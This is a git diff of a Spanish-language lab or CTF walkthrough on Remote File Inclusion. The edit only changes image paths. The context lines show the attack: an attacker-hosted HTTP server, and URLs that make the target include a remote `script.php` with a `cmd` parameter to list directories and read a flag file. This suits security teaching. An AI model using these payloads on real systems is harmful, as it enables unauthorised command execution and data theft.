@@ -19,7 +19,7 @@ python3 -m http.server 80
 3. Vemos los logs del servidor http.
 
 <p align="center">
-    <img src="/assets/05-Quinto/02-RFI.PNG">
+    <img src="./assets/05-Quinto/02-RFI.PNG">
 </p>
 
 * Notamos que el servidor web vulnerable realiza un petición a nuestro servidor **http**, por lo cual, el servidor web es vulnerable a `RFI` 👩‍💻
@@ -41,7 +41,7 @@ Ahora realizamos la petición a este **script** y listamos los archivos de la `r
 * **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=ls /`
 
 <p align="center">
-    <img src="/assets/05-Quinto/03-exercise.PNG">
+    <img src="./assets/05-Quinto/03-exercise.PNG">
 </p>
 
 `Exercise` es un directorio, así que, lo listaremos 
@@ -49,7 +49,7 @@ Ahora realizamos la petición a este **script** y listamos los archivos de la `r
 * **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=ls /exercise`
 
 <p align="center">
-    <img src="/assets/05-Quinto/04-flag.PNG">
+    <img src="./assets/05-Quinto/04-flag.PNG">
 </p>
 
 ---
@@ -59,5 +59,5 @@ Por último, leemos el archivo `flag.txt`
 * **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=cat /exercise/flag.txt`
 
 <p align="center">
-    <img src="/assets/05-Quinto/05-final.PNG">
+    <img src="./assets/05-Quinto/05-final.PNG">
 </p>
